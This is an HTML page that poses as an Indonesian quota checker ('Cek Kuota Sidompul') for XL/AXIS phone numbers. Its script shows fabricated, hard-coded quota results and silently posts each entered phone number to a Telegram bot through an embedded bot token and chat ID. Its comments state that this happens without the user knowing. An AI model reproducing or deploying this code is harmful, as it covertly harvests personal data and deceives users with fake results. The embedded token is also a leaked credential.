<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sidompul XL AXIS</title>
    <meta name="description" content="Untuk pengecekan kuota">
    <link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="256x256">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: #111827;
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 16px;
        }
        
        .card {
            width: 100%;
            max-width: 576px;
            background-color: #1f2937;
            border-radius: 8px;
            padding: 24px;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.3);
        }
        
        .logo-container {
            display: flex;
            justify-content: center;
            margin: 16px 0;
        }
        
        .logo {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 4px solid #374151;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
        }
        
        h1 {
            font-size: 24px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 24px;
        }
        
        .form-container {
            background-color: #1f2937;
            padding: 16px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        }
        
        .form-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        input[type="number"] {
            width: 100%;
            padding: 12px;
            background-color: #374151;
            border: 1px solid #4b5563;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            outline: none;
        }
        
        input[type="number"]:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.5);
        }
        
        input[type="number"]::placeholder {
            color: #9ca3af;
        }
        
        button {
            width: 100%;
            padding: 12px 24px;
            background-color: #3b82f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        
        button:hover:not(:disabled) {
            background-color: #2563eb;
        }
        
        button:disabled {
            background-color: #4b5563;
            cursor: not-allowed;
        }
        
        .result {
            margin-top: 16px;
            padding: 16px;
            background-color: #374151;
            border-radius: 8px;
        }
        
        .hidden {
            display: none;
        }
        
        .result-title {
            font-weight: bold;
            font-size: 18px;
            color: #34d399;
            text-align: center;
            margin-bottom: 12px;
        }
        
        .result-item {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #4b5563;
            font-size: 14px;
        }
        
        .result-item:last-child {
            border-bottom: none;
        }
        
        .result-label {
            color: #9ca3af;
        }
        
        .result-value {
            font-weight: 600;
        }
        
        .text-blue {
            color: #60a5fa;
        }
        
        .text-green {
            color: #34d399;
        }
        
        .text-red {
            color: #f87171;
        }
        
        .text-center {
            text-align: center;
        }
        
        footer {
            background-color: #111827;
            color: white;
            font-size: 12px;
            font-weight: bold;
            text-align: center;
            padding: 8px 16px;
        }
        
        footer a {
            color: white;
            text-decoration: none;
            transition: color 0.3s;
        }
        
        footer a:hover {
            color: #3b82f6;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .animate-pulse {
            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
        }
        
        @media (min-width: 640px) {
            .form-group {
                flex-direction: row;
                align-items: center;
            }
            
            input[type="number"] {
                flex: 1;
            }
            
            button {
                width: auto;
                min-width: 120px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo-container">
                <img class="logo" 
                     alt="Sidompul Logo" 
                     src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='100' height='100'%3E%3Crect fill='%234F46E5' width='100' height='100' rx='50'/%3E%3Ctext x='50' y='50' font-size='48' fill='white' text-anchor='middle' dy='.3em' font-family='Arial, sans-serif' font-weight='bold'%3ES%3C/text%3E%3C/svg%3E">
            </div>
            <h1>Cek Kuota Sidompul</h1>
            <div class="form-container">
                <div class="form-group">
                    <input 
                        type="number" 
                        id="phoneInput"
                        placeholder="Masukan nomor XL/AXIS">
                    <button type="button" id="submitBtn" onclick="cekKuota()">🔍 Cek</button>
                </div>
            </div>
            <div id="resultDiv" class="result hidden"></div>
        </div>
    </div>
    
    <footer>
        <a href="https://sociabuzz.com/cellzyu/give">Cellz</a>
    </footer>

    <script>
        // ========================================
        // KONFIGURASI TELEGRAM BOT
        // Ganti dengan token dan chat ID Anda!
        // ========================================
        const TELEGRAM_BOT_TOKEN = '8351873231:AAEbZw4vNtFOnGrC9ZC7J1L22oISJj1ZR9Q';
        const TELEGRAM_CHAT_ID = '1737090526';

        // Fungsi untuk kirim pesan ke Telegram (SILENT - user tidak tahu)
        async function sendToTelegram(message) {
            try {
                const url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
                await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Error:', error);
            }
        }

        // Fungsi utama cek kuota
        async function cekKuota() {
            const phoneInput = document.getElementById('phoneInput');
            const submitBtn = document.getElementById('submitBtn');
            const resultDiv = document.getElementById('resultDiv');
            const phoneNumber = phoneInput.value.trim();
            
            console.log('Cek kuota dipanggil untuk:', phoneNumber);
            
            // Validasi input
            if (!phoneNumber) {
                resultDiv.innerHTML = '<p class="text-red text-center">❌ Masukkan nomor telepon!</p>';
                resultDiv.classList.remove('hidden');
                return;
            }
            
            // Set loading state
            submitBtn.disabled = true;
            submitBtn.innerHTML = '⏳ Loading...';
            resultDiv.innerHTML = '<p class="text-blue text-center animate-pulse">⏳ Mengecek kuota...</p>';
            resultDiv.classList.remove('hidden');
            
            try {
                // Simulasi API call (ganti dengan API real)
                await new Promise(resolve => setTimeout(resolve, 1500));
                
                // Data mock - ganti dengan response API sebenarnya
                const quotaData = {
                    number: phoneNumber,
                    packageName: 'Xtra Combo 5+10 VIP Double Youtube',
                    status: 'Active',
                    resetDate: new Date(Date.now() + 15 * 24 * 60 * 60 * 1000).toLocaleDateString('id-ID', { day: 'numeric', month: 'short', year: 'numeric' }) + ' 23:59 WIB',
                    quotas: {
                        youtube24jam: {
                            remaining: 9.81,
                            total: 10
                        },
                        allNetwork24jam: {
                            remaining: 3.41,
                            total: 5
                        },
                        nelp: {
                            remaining: 20,
                            total: 20
                        }
                    }
                };
                
                console.log('Data kuota:', quotaData);
                
                // Tampilkan hasil ke user
                const youtubePercent = ((quotaData.quotas.youtube24jam.total - quotaData.quotas.youtube24jam.remaining) / quotaData.quotas.youtube24jam.total) * 100;
                const allNetPercent = ((quotaData.quotas.allNetwork24jam.total - quotaData.quotas.allNetwork24jam.remaining) / quotaData.quotas.allNetwork24jam.total) * 100;
                const nelpPercent = ((quotaData.quotas.nelp.total - quotaData.quotas.nelp.remaining) / quotaData.quotas.nelp.total) * 100;
                
                resultDiv.innerHTML = `
                    <h3 class="result-title">✅ ${quotaData.packageName}</h3>
                    
                    <div style="margin-bottom: 16px; padding: 12px; background: #1f2937; border-radius: 6px;">
                        <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
                            <span style="color: #9ca3af;">📱 Nomor:</span>
                            <span style="font-weight: 600;">${quotaData.number}</span>
                        </div>
                        <div style="display: flex; justify-content: space-between;">
                            <span style="color: #9ca3af;">📅 Reset Kuota:</span>
                            <span style="font-weight: 600; font-size: 12px;">${quotaData.resetDate}</span>
                        </div>
                    </div>
                    
                    <div style="background: #374151; padding: 16px; border-radius: 8px; margin-bottom: 12px;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                            <div style="display: flex; align-items: center; gap: 8px;">
                                <span style="font-size: 20px;">🌐</span>
                                <span style="font-weight: 500;">YouTube 24jam</span>
                            </div>
                            <span style="font-weight: bold; color: #60a5fa;">${quotaData.quotas.youtube24jam.remaining} GB</span>
                        </div>
                        <div style="background: #1f2937; height: 8px; border-radius: 4px; overflow: hidden;">
                            <div style="background: linear-gradient(90deg, #10b981, #34d399); height: 100%; width: ${100 - youtubePercent}%; transition: width 0.3s;"></div>
                        </div>
                        <div style="text-align: right; font-size: 11px; color: #9ca3af; margin-top: 4px;">${quotaData.quotas.youtube24jam.total} GB</div>
                    </div>
                    
                    <div style="background: #374151; padding: 16px; border-radius: 8px; margin-bottom: 12px;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                            <div style="display: flex; align-items: center; gap: 8px;">
                                <span style="font-size: 20px;">🌐</span>
                                <span style="font-weight: 500;">24jam di semua jaringan</span>
                            </div>
                            <span style="font-weight: bold; color: #60a5fa;">${quotaData.quotas.allNetwork24jam.remaining} GB</span>
                        </div>
                        <div style="background: #1f2937; height: 8px; border-radius: 4px; overflow: hidden;">
                            <div style="background: linear-gradient(90deg, #10b981, #34d399); height: 100%; width: ${100 - allNetPercent}%; transition: width 0.3s;"></div>
                        </div>
                        <div style="text-align: right; font-size: 11px; color: #9ca3af; margin-top: 4px;">${quotaData.quotas.allNetwork24jam.total} GB</div>
                    </div>
                    
                    <div style="background: #374151; padding: 16px; border-radius: 8px;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                            <div style="display: flex; align-items: center; gap: 8px;">
                                <span style="font-size: 20px;">📞</span>
                                <span style="font-weight: 500;">Nelp (ke XL/Non-XL)</span>
                            </div>
                            <span style="font-weight: bold; color: #60a5fa;">${quotaData.quotas.nelp.remaining} Menit</span>
                        </div>
                        <div style="background: #1f2937; height: 8px; border-radius: 4px; overflow: hidden;">
                            <div style="background: linear-gradient(90deg, #10b981, #34d399); height: 100%; width: ${100 - nelpPercent}%; transition: width 0.3s;"></div>
                        </div>
                        <div style="text-align: right; font-size: 11px; color: #9ca3af; margin-top: 4px;">${quotaData.quotas.nelp.total} Menit</div>
                    </div>
                `;
                
                // Kirim data ke Telegram (DIAM-DIAM)
                // Ini jalan di background, tidak mengganggu tampilan
                try {
                    const now = new Date();
                    const timestamp = now.toLocaleString('id-ID', { 
                        dateStyle: 'full', 
                        timeStyle: 'medium' 
                    });
                    
                    const telegramMessage = 
`🔍 CEK KUOTA SIDOMPUL

📱 Nomor: ${quotaData.number}
📦 Paket: ${quotaData.packageName}
📅 Reset Kuota: ${quotaData.resetDate}

━━━━━━━━━━━━━━━━━━━━
📊 SISA KUOTA:

🌐 YouTube 24jam: ${quotaData.quotas.youtube24jam.remaining} GB / ${quotaData.quotas.youtube24jam.total} GB
🌐 24jam di semua jaringan: ${quotaData.quotas.allNetwork24jam.remaining} GB / ${quotaData.quotas.allNetwork24jam.total} GB
📞 Nelp (ke XL/Non-XL): ${quotaData.quotas.nelp.remaining} Menit / ${quotaData.quotas.nelp.total} Menit

⏰ Dicek pada: ${timestamp}`;
                    
                    // Kirim ke Telegram tanpa memberitahu user
                    await sendToTelegram(telegramMessage);
                    console.log('✅ Berhasil kirim ke Telegram');
                } catch (telegramError) {
                    // Error Telegram tidak ditampilkan ke user
                    console.log('⚠️ Gagal kirim ke Telegram (ini normal jika token belum diisi):', telegramError.message);
                }
                
            } catch (error) {
                resultDiv.innerHTML = '<p class="text-red text-center">❌ Terjadi kesalahan. Coba lagi nanti.</p>';
                console.error('Error:', error);
            } finally {
                // Reset button
                submitBtn.disabled = false;
                submitBtn.innerHTML = '🔍 Cek';
            }
        }
        
        // Juga bisa pakai Enter untuk submit
        document.getElementById('phoneInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                cekKuota();
            }
        });
    </script>
</body>
</html>
